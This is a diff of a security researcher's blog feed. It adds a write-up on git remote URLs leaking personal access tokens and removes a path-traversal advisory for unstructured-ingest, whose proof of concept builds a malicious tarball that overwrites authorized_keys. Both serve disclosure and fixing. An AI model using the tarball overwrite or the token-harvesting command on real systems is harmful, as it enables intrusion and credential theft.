@@ -1,4 +1,74 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-30T17:44:59+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Command injection via unsafe pickle.loads in nltk.data.load in NLTK</title><link href="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in nltk.data.load in NLTK" /><published>2024-06-28T10:31:06+08:00</published><updated>2024-06-28T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-07-01T17:45:03+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Git remote origin leaks user access token</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html" rel="alternate" type="text/html" title="Git remote origin leaks user access token" /><published>2024-07-01T10:31:06+08:00</published><updated>2024-07-01T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Git remote origin leaks user access token</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>2.45.2</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>Lots of people are using personal access token to clone their private repository. To use a access token, you can include your username and token in https url to clone projects on github, gitlab or any other DevOps Platform:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://&lt;username&gt;:&lt;token&gt;@github.com/username/repository.git
+</code></pre></div></div>
+
+<p>However, we can get the token back easily by just using <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd privateProject
+git remote get-url origin
+&gt; https://username:ghp_xxxxx@github.com/username/repository.git
+</code></pre></div></div>
+
+<p>This can be dangerous, because we often run third party tools in our private repository. If a malicious tool runs <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>, it can steal our personal access token of github or gitlab. In this case, our github/gitlab will be controlled by attackers which can have severe consequences.</p>
+
+<p>I found this issue during code auditing via <a href="https://github.com/pyupio/safety">safety tool</a>. After scanning a project using <code class="language-plaintext highlighter-rouge">safety check -r requirements.txt --save-json test.json</code>, safety saved results into <code class="language-plaintext highlighter-rouge">test.json</code> file. However, when I looked into <code class="language-plaintext highlighter-rouge">test.json</code>, I found my personal access token in this file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"report_meta": {
+    "scan_target": "files",
+    "scanned": [
+        "/home/kali/huntr/azure-sdk-for-python/tools/azure-sdk-tools/ci_tools/versioning/requirements.txt"
+    ],
+    "target_languages": [
+        "python"
+    ],
+    "git": {
+        "branch": "main",
+        "tag": "",
+        "commit": "b182b0c4f9d07d18f118130bc941c3b7a75667b1",
+        "dirty": false,
+        "origin": "https://outh2:ghp_xxxx@github.com/sunriseXu/xxxx.git"
+    },
+}
+</code></pre></div></div>
+
+<p>So, I looked into the source code of safety. The class <a href="https://github.com/pyupio/safety/blob/f15d7908d27fd887dcc6b31237b8e3df79a9359b/safety/scan/util.py#L49"><code class="language-plaintext highlighter-rouge">GIT</code></a> is responsible for collecting repository information in current repo where safety runs.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class GIT:
+    ORIGIN_CMD: Tuple[str, ...] = ("remote", "get-url", "origin")
+    def __run__(self, cmd: Tuple[str, ...], env_var: Optional[str] = None) -&gt; Optional[str]:
+        if env_var and os.environ.get(env_var):
+            return os.environ.get(env_var)
+
+        try:
+            return subprocess.run(self.git + cmd, stdout=subprocess.PIPE, 
+                                    stderr=subprocess.DEVNULL).stdout.decode('utf-8').strip()
+        except Exception as e:
+            LOG.exception(e)
+        
+        return None
+    def origin(self) -&gt; Optional[str]:
+        # get the origin of repository
+        return self.__run__(self.ORIGIN_CMD, env_var="SAFETY_GIT_ORIGIN")
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This can have severe consequences. <strong>Any</strong> tools running in private repositories have ability to steal personal access token if the token is written in git remote url explicitly. Git should mask user’s access token when using cli command <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in nltk.data.load in NLTK</title><link href="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in nltk.data.load in NLTK" /><published>2024-06-28T10:31:06+08:00</published><updated>2024-06-28T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Command injection via unsafe pickle.loads in nltk.data.load</p>
@@ -982,213 +1052,4 @@ prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
 
 <p><a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>
 
-<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.]]></summary></entry><entry><title type="html">Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)" /><published>2024-05-29T10:31:06+08:00</published><updated>2024-05-29T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Arbitrary File Overwrite via unstructured-ingest with uncompress enabled in unstructured</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="version">Version</h2>
-
-<blockquote>
-  <p>0.14.3</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>The unstructured ingest provide extra <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">sftp</code></a> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/google-cloud-storage"><code class="language-plaintext highlighter-rouge">gcs</code></a> modules to batch process all documents in remote cloud storages. The <a href="https://github.com/Unstructured-IO/unstructured/blob/3158169585b0ce8bbe784762133b244271a9dec8/unstructured/ingest/utils/compression.py#L76"><code class="language-plaintext highlighter-rouge">process_compressed_doc</code></a> is called to extract the compressed tarball files to local file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar.gz files that can overwrite any file.</p>
-
-<p>Using unstructured python sdk, a victim may download malicious tarball from remote cloud storages. The call stack is following: <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/pipeline/doc_factory.py#L10"><code class="language-plaintext highlighter-rouge">DocFactory.run</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/connector/fsspec/fsspec.py#L262"><code class="language-plaintext highlighter-rouge">FsspecSourceConnector.get_ingest_docs</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83"><code class="language-plaintext highlighter-rouge">CompressionSourceConnectorMixin.process_compressed_doc</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L33"><code class="language-plaintext highlighter-rouge">uncompress_file</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a>, The <code class="language-plaintext highlighter-rouge">uncompress_tar_file</code> calls <code class="language-plaintext highlighter-rouge">tarball.extractall</code> without sanitizing the members in tarball, causing members with absolute names or relative names will extracted and written outside target folder.</p>
-
-<p>The <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a> function:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
-    head, tail = os.path.split(tar_filename)
-    for ext in TAR_FILE_EXT:
-        if tail.endswith(ext):
-            tail = tail[: -(len(ext))]
-            break
-
-    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
-    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
-    with tarfile.open(tar_filename, "r:gz") as tfile:
-        tfile.extractall(path=path)
-    return path
-</code></pre></div></div>
-
-<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
-It is possible that files are created outside of path, 
-e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>For simplicity, I use sftp ingest to batch process documents from a test sftp server.</p>
-
-<p>First, let’s start a simple sftp server using docker from <a href="https://hub.docker.com/r/atmoz/sftp/"><code class="language-plaintext highlighter-rouge">atmoz/sftp</code></a>. The server is listen at my local network <code class="language-plaintext highlighter-rouge">10.15.0.5:2222</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -p 2222:22 -d atmoz/sftp foo:pass:::upload
-</code></pre></div></div>
-
-<p>Next, create a malicous tar file using following command:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -czvf hack.tar.gz /home/kali/.ssh/authorized_keys
-</code></pre></div></div>
-
-<p>Then, upload <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> to previously created sftp server.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># login to sftp server, account: foo, password: pass
-sftp -P 2222 foo@10.15.0.5
-
-# cd into upload folder
-sftp&gt; cd upload
-
-# upload hack.tar.gz
-sftp&gt; put hack.tar.gz
-sftp&gt; ls -la
--rw-r--r--    1 1000     100          2531 May 29 05:35 hack.tar.gz
-</code></pre></div></div>
-
-<p>Install <code class="language-plaintext highlighter-rouge">structrue</code> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">structure[sftp]</code></a>(using python3.10):</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install unstructured
-pip install "unstructured[sftp]"
-</code></pre></div></div>
-
-<p>Using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp">python snippets</a> in offical document to fetch all documents from sftp server, note that with <code class="language-plaintext highlighter-rouge">uncompress=True</code> set, save as <code class="language-plaintext highlighter-rouge">unstructured_sftp.py</code>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from unstructured.ingest.interfaces import (
-    PartitionConfig,
-    ProcessorConfig,
-    ReadConfig,
-)
-from unstructured.ingest.runner import SftpRunner
-
-if __name__ == "__main__":
-    runner = SftpRunner(
-        processor_config=ProcessorConfig(
-            verbose=True,
-            output_dir="sftp-output",
-            num_processes=2,
-        ),
-        read_config=ReadConfig(),
-        partition_config=PartitionConfig(),
-        connector_config=SimpleSftpConfig(
-            access_config=SftpAccessConfig(
-                username="foo",
-                password="pass",
-            ),
-            remote_url="sftp://10.15.0.5:2222/upload",
-            recursive=True,
-            uncompress=True
-        ),
-    )
-    runner.run()
-</code></pre></div></div>
-
-<p>Lauch the attack, the file <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> in local system is overwritten</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python unstructured_sftp.py
-
-&gt; cat /home/kali/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
-</code></pre></div></div>
-
-<p>Or just using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">unstructured-ingest sftp</code> shell command</a> with <code class="language-plaintext highlighter-rouge">--uncompress</code> enabled:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; unstructured-ingest \
-  sftp \
-  --remote-url sftp://10.15.0.5:2222/upload \
-  --username "foo" \
-  --password "pass" \
-  --num-processes 2 \
-  --recursive \
-  --uncompress \
-  --verbose
-
-
-&gt; cat /home/kali/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
-</code></pre></div></div>
-
-<h2 id="platform">Platform</h2>
-
-<p>I noticed the platform Data Ingestion Source Connectors also have <code class="language-plaintext highlighter-rouge">uncompress</code> option, For example:</p>
-
-<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/sftp-storage">sftp-storage</a></p>
-
-<p><img src="/assets/images/bughunter/unstructured/Source-SFTP.png" alt="sftp" /></p>
-
-<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/google-cloud">google cloud storage</a></p>
-
-<p><img src="/assets/images/bughunter/unstructured/Source-Google-Cloud.png" alt="gc" /></p>
-
-<h2 id="fix">Fix</h2>
-
-<p>Patch for <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L56C1-L67C16">uncompress_tar_file</a></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
-    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
-    def extraction_filter(member, path):
-        """Run tarfile.tar_filter, but raise the expected ValueError"""
-        # This is only called if the current Python has tarfile filters
-        try:
-            return tarfile.tar_filter(member, path)
-        except tarfile.FilterError as exc:
-            raise ValueError(str(exc))
-    
-    head, tail = os.path.split(tar_filename)
-    for ext in TAR_FILE_EXT:
-        if tail.endswith(ext):
-            tail = tail[: -(len(ext))]
-            break
-
-    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
-    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
-    with tarfile.open(tar_filename, "r:gz") as tfile:
-        tfile.extraction_filter = extraction_filter
-        tfile.extractall(path=path)
-    return path
-</code></pre></div></div>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
-
-<h3 id="ssh-access">SSH Access</h3>
-
-<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
-
-<h3 id="web-servers">Web Servers</h3>
-
-<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p>Version v1</p>
-
-<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83</a></p>
-
-<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66</a></p>
-
-<p>Version V2</p>
-
-<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.]]></summary></entry></feed>
